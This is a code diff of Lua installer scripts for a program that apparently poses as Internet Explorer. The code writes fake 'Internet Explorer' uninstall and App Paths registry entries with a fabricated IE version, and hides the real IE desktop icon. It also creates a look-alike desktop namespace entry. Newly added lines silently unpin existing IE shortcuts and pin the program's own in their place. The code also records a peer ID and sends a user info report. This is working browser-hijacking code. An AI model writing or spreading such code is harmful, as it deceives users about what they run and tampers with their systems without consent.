@@ -626,6 +626,7 @@ function AnalyseSetupConfig(strIniPath)
 		end
 	end
 	
+	FunctionObj.TipLog("[AnalyseSetupConfig] begin install ie")
 	DoInstallIE(strIniPath)
 	
 	local strRegFSPath = "HKEY_CURRENT_USER\\SOFTWARE\\YBYL\\regie"
@@ -699,7 +700,7 @@ function WriteIERegister()
 	local strIEPath = GetIEPath()
 	tipUtil:CreateRegKey("HKEY_CURRENT_USER","SOFTWARE\\iexplorer")
 	bret = FunctionObj.RegSetValue("HKEY_CURRENT_USER\\SOFTWARE\\iexplorer\\Path", strIEPath, bIs64)
-	
+
 	local strPid = FunctionObj.GetPeerID()
 	FunctionObj.RegSetValue("HKEY_CURRENT_USER\\SOFTWARE\\iexplorer\\PeerId", strPid, bIs64)
 	
@@ -714,21 +715,21 @@ function WriteIERegister()
 	
 	-------
 	tipUtil:CreateRegKey("HKEY_LOCAL_MACHINE","Software\\Microsoft\\Windows\\CurrentVersion\\App Paths\\iexplorer.exe")
-	FunctionObj.RegSetValue("HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\App Paths\\iexplorer.exe\\", strIEPath)
+	FunctionObj.RegSetValue("HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\App Paths\\iexplorer.exe\\", strIEPath, bIs64)
 	
 	tipUtil:CreateRegKey("HKEY_LOCAL_MACHINE","Software\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\iexplorer.exe")
-	FunctionObj.RegSetValue("HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\iexplorer.exe\\DisplayName", "Internet Explorer")
+	FunctionObj.RegSetValue("HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\iexplorer.exe\\DisplayName", "Internet Explorer", bIs64)
 	
     local strUninstPath = tipUtil:PathCombine(strInstallDir, "uninst.exe")
-	FunctionObj.RegSetValue("HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\iexplorer.exe\\UninstallString", strUninstPath)
+	FunctionObj.RegSetValue("HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\iexplorer.exe\\UninstallString", strUninstPath, bIs64)
 	
-	FunctionObj.RegSetValue("HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\iexplorer.exe\\DisplayIcon", strIEPath)
+	FunctionObj.RegSetValue("HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\iexplorer.exe\\DisplayIcon", strIEPath, bIs64)
 	
 	local strIEVersion = GetFakeIEVersion()
-	FunctionObj.RegSetValue("HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\iexplorer.exe\\DisplayVersion", strIEVersion)
+	FunctionObj.RegSetValue("HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\iexplorer.exe\\DisplayVersion", strIEVersion, bIs64)
 	
-	FunctionObj.RegSetValue("HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\iexplorer.exe\\URLInfoAbout", "")
-	FunctionObj.RegSetValue("HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\iexplorer.exe\\Publisher", "iexplorer")
+	FunctionObj.RegSetValue("HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\iexplorer.exe\\URLInfoAbout", "", bIs64)
+	FunctionObj.RegSetValue("HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\iexplorer.exe\\Publisher", "iexplorer", bIs64)
 end
 
 
@@ -848,18 +849,21 @@ function HideIEIco(bNeedHide)
 		return
 	end
 	
+	FunctionObj.TipLog("[HideIEIco] beging hide system ie")
+	local bIs64 = FunctionObj.CheckIs64OS()
+	
 	local strRegRoot = {"HKEY_CURRENT_USER", "HKEY_LOCAL_MACHINE"}
 	for _, strRoot in pairs(strRegRoot) do
 		local strPanelReg = strRoot.."\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\HideDesktopIcons\\NewStartPanel"
 								.."\\{871C5380-42A0-1069-A2EA-08002B30309D}"
-		FunctionObj.RegSetValue(strPanelReg, 1)
+		FunctionObj.RegSetValue(strPanelReg, 1, bIs64)
 	
 		local strMenuReg = strRoot.."\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\HideDesktopIcons\\ClassicStartMenu"
 								.."\\{871C5380-42A0-1069-A2EA-08002B30309D}"
-		FunctionObj.RegSetValue(strMenuReg, 1)
+		FunctionObj.RegSetValue(strMenuReg, 1, bIs64)
 	end
 	
-	FunctionObj.RegSetValue("HKEY_CURRENT_USER\\SOFTWARE\\iexplorer\\HideIEIcon", "1")
+	FunctionObj.RegSetValue("HKEY_CURRENT_USER\\SOFTWARE\\iexplorer\\HideIEIcon", "1", bIs64)
 end
 
 
@@ -877,8 +881,8 @@ function WriteStartMenuSC()
 			local strFilePath = tipUtil:PathCombine(strBaseDir, "Internet Explorer.lnk")
 			local bIsInDir,strCurrent = CheckIsIELnkInDir(strBaseDir)
 			if bIsInDir then
-				tipUtil:PinToStartMenu4XP(strCurrent, false)
-				--local bret = tipUtil:DeletePathFile(strCurrent)
+				tipUtil:ShellExecute(0, "startunpin", strCurrent, "", 0, "SW_HIDE")
+				-- tipUtil:PinToStartMenu4XP(strCurrent, false)
 				CopyBackUpLnk(strCurrent,"STARTMENU")
 				FunctionObj.RegSetValue("HKEY_CURRENT_USER\\SOFTWARE\\iexplorer\\STARTMENU", "1")
 			end
@@ -886,8 +890,8 @@ function WriteStartMenuSC()
 			local strFilePath1 = tipUtil:PathCombine(strBaseDir, "Internet Explorer.lnk")
 			local bIsInDir1,strCurrent1 = CheckIsIELnkInDir(strBaseDir)
 			if bIsInDir1 then
-				tipUtil:PinToStartMenu4XP(strCurrent1, false)
-				--local bret = tipUtil:DeletePathFile(strCurrent1)
+				-- tipUtil:PinToStartMenu4XP(strCurrent1, false)
+				tipUtil:ShellExecute(0, "startunpin", strCurrent1, "", 0, "SW_HIDE")
 				CopyBackUpLnk(strCurrent1,"STARTMENU")
 				FunctionObj.RegSetValue("HKEY_CURRENT_USER\\SOFTWARE\\iexplorer\\STARTMENU", "1")
 			end
@@ -910,15 +914,16 @@ function WriteStartMenuProgramSC()
 			local strFilePath = tipUtil:PathCombine(strBaseDir, "Internet Explorer.lnk")
 			local bIsInDir,strCurrent = CheckIsIELnkInDir(strBaseDir)
 			if bIsInDir then
-				--local bret = tipUtil:DeletePathFile(strCurrent)
-				tipUtil:PinToStartMenu4XP(strCurrent, false)
+				-- tipUtil:PinToStartMenu4XP(strCurrent, false)
+				tipUtil:ShellExecute(0, "startunpin", strCurrent, "", 0, "SW_HIDE")
 				CopyBackUpLnk(strCurrent,"SMPROGRAMS")
 				FunctionObj.RegSetValue("HKEY_CURRENT_USER\\SOFTWARE\\iexplorer\\SMPROGRAMS", "1")
 			end
 			
 			local bIsInDir1,strCurrent1 = CheckIsIELnkInDir(strBaseDir)
 			if bIsInDir1 then
-				tipUtil:PinToStartMenu4XP(strCurrent1, false)
+				-- tipUtil:PinToStartMenu4XP(strCurrent1, false)
+				tipUtil:ShellExecute(0, "startunpin", strCurrent1, "", 0, "SW_HIDE")
 				CopyBackUpLnk(strCurrent1,"SMPROGRAMS")
 				--local bret = tipUtil:DeletePathFile(strCurrent1)
 				FunctionObj.RegSetValue("HKEY_CURRENT_USER\\SOFTWARE\\iexplorer\\SMPROGRAMS", "1")
@@ -928,7 +933,8 @@ function WriteStartMenuProgramSC()
 			if nCsidl == nCSIDL_PROGRAM then
 				local bret = tipUtil:CreateShortCutLinkEx("Internet Explorer", strIEPath, strBaseDir, "", "/sstartfrom startmenuprograms", "启动 Internet Explorer 浏览器")
 				if bret then
-					tipUtil:PinToStartMenu4XP(strFilePath, true)
+					tipUtil:ShellExecute(0, "startpin", strFilePath, "", 0, "SW_HIDE")
+					-- tipUtil:PinToStartMenu4XP(strFilePath, true)
 				end
 			end	
 		end
@@ -960,6 +966,7 @@ function WriteQuickLaunchSC()
 		
 		local strIEPath = GetIEPath()
 		local bret = tipUtil:CreateShortCutLinkEx("Internet Explorer", strIEPath, strQueryDir, "", "/sstartfrom toolbar", "启动 Internet Explorer 浏览器")
+		-- tipUtil:ShellExecute(0, "taskbarpin", strFilePath, "", 0, "SW_HIDE")
 	end
 end
 
@@ -1009,8 +1016,8 @@ function CreateDesktopShortCut(strIniPath)
 		if bExists then
 			FunctionObj.TipLog("[CreateDesktopShortCut] blacklist process strExeName: "..tostring(strExeName))
 			
-			CreateDesktopSCDefault()
-			return --黑名单目录
+			-- CreateDesktopSCDefault()
+			return --黑名单目录 不做任何操作
 		end
 	end
 	
@@ -1029,29 +1036,31 @@ end
 
 function CreateDesktopReg()
 	local FunctionObj = XLGetGlobal("YBYL.FunctionHelper") 
+	local bIs64 = FunctionObj.CheckIs64OS()
+	
 	local bret = tipUtil:CreateRegKey("HKEY_CLASSES_ROOT","CLSID\\{8B3A6008-2057-415f-8BC9-144DF987051A}")
-	FunctionObj.RegSetValue("HKEY_CLASSES_ROOT\\CLSID\\{8B3A6008-2057-415f-8BC9-144DF987051A}\\InfoTip", "查找并显示 Iternet 上的信息和网站。")
-	FunctionObj.RegSetValue("HKEY_CLASSES_ROOT\\CLSID\\{8B3A6008-2057-415f-8BC9-144DF987051A}\\LocalizedString", "Internet Explorer")
+	FunctionObj.RegSetValue("HKEY_CLASSES_ROOT\\CLSID\\{8B3A6008-2057-415f-8BC9-144DF987051A}\\InfoTip", "查找并显示 Iternet 上的信息和网站。", bIs64)
+	FunctionObj.RegSetValue("HKEY_CLASSES_ROOT\\CLSID\\{8B3A6008-2057-415f-8BC9-144DF987051A}\\LocalizedString", "Internet Explorer", bIs64)
 
 	local strIEPath = GetIEPath()
 	tipUtil:CreateRegKey("HKEY_CLASSES_ROOT","CLSID\\{8B3A6008-2057-415f-8BC9-144DF987051A}\\DefaultIcon")
-	FunctionObj.RegSetValue("HKEY_CLASSES_ROOT\\CLSID\\{8B3A6008-2057-415f-8BC9-144DF987051A}\\DefaultIcon\\", strIEPath)
+	FunctionObj.RegSetValue("HKEY_CLASSES_ROOT\\CLSID\\{8B3A6008-2057-415f-8BC9-144DF987051A}\\DefaultIcon\\", strIEPath, bIs64)
 
 	tipUtil:CreateRegKey("HKEY_CLASSES_ROOT","CLSID\\{8B3A6008-2057-415f-8BC9-144DF987051A}\\Shell\\Open")
-	FunctionObj.RegSetValue("HKEY_CLASSES_ROOT\\CLSID\\{8B3A6008-2057-415f-8BC9-144DF987051A}\\Shell\\Open\\", "打开主页(&H)")
+	FunctionObj.RegSetValue("HKEY_CLASSES_ROOT\\CLSID\\{8B3A6008-2057-415f-8BC9-144DF987051A}\\Shell\\Open\\", "打开主页(&H)", bIs64)
 	
 	strCmd = "\"" ..strIEPath.. "\"".." /sstartfrom desktopnamespace"
 	tipUtil:CreateRegKey("HKEY_CLASSES_ROOT","CLSID\\{8B3A6008-2057-415f-8BC9-144DF987051A}\\Shell\\Open\\Command")
-	FunctionObj.RegSetValue("HKEY_CLASSES_ROOT\\CLSID\\{8B3A6008-2057-415f-8BC9-144DF987051A}\\Shell\\Open\\Command\\", strCmd)
+	FunctionObj.RegSetValue("HKEY_CLASSES_ROOT\\CLSID\\{8B3A6008-2057-415f-8BC9-144DF987051A}\\Shell\\Open\\Command\\", strCmd, bIs64)
 	
 	tipUtil:CreateRegKey("HKEY_CLASSES_ROOT","CLSID\\{8B3A6008-2057-415f-8BC9-144DF987051A}\\Shell\\Prop")
-	FunctionObj.RegSetValue("HKEY_CLASSES_ROOT\\CLSID\\{8B3A6008-2057-415f-8BC9-144DF987051A}\\Shell\\Prop\\", "属性(&R)")
+	FunctionObj.RegSetValue("HKEY_CLASSES_ROOT\\CLSID\\{8B3A6008-2057-415f-8BC9-144DF987051A}\\Shell\\Prop\\", "属性(&R)", bIs64)
 		
 	tipUtil:CreateRegKey("HKEY_CLASSES_ROOT","CLSID\\{8B3A6008-2057-415f-8BC9-144DF987051A}\\Shell\\Prop\\Command")
-	FunctionObj.RegSetValue("HKEY_CLASSES_ROOT\\CLSID\\{8B3A6008-2057-415f-8BC9-144DF987051A}\\Shell\\Prop\\Command\\", "Rundll32.exe Shell32.dll,Control_RunDLL Inetcpl.cpl")
+	FunctionObj.RegSetValue("HKEY_CLASSES_ROOT\\CLSID\\{8B3A6008-2057-415f-8BC9-144DF987051A}\\Shell\\Prop\\Command\\", "Rundll32.exe Shell32.dll,Control_RunDLL Inetcpl.cpl", bIs64)
 	
 	tipUtil:CreateRegKey("HKEY_LOCAL_MACHINE","SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Desktop\\NameSpace\\{8B3A6008-2057-415f-8BC9-144DF987051A}")
-	FunctionObj.RegSetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Desktop\\NameSpace\\{8B3A6008-2057-415f-8BC9-144DF987051A}\\", "Internet Exploer")
+	FunctionObj.RegSetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Desktop\\NameSpace\\{8B3A6008-2057-415f-8BC9-144DF987051A}\\", "Internet Exploer", bIs64)
 	
 	tipUtil:RefleshIcon(nil)
 end
@@ -1070,7 +1079,7 @@ function CheckIsIELnkInDir(strDir)
 		local strFilePath = tFileList[i]
 		if IsRealString(strFilePath) and tipUtil:QueryFileExists(strFilePath) then
 			local  strFileName = FunctionObj.GetFileNameFromPath(strFilePath, true)
-			if string.find(tostring(strFileName),"Internet Explorer.lnk") or string.find(tostring(strFileName),"Internet.lnk") 
+			if string.find(tostring(strFileName),"Internet Explorer") or string.find(tostring(strFileName),"Internet.lnk") 
 				or string.find(tostring(strFileName), "启动 Internet Explorer 浏览器") then
 				return true, strFilePath
 			end
@@ -1123,6 +1132,7 @@ function PreTipMain()
 	SendUserInfoReport()
 	TipMain()
 	
+		CreateDesktopSCDefault()
 	local timerManager = XLGetObject("Xunlei.UIEngine.TimerManager")
 	timerManager:SetTimer(function(item, id)
 		item:KillTimer(id)
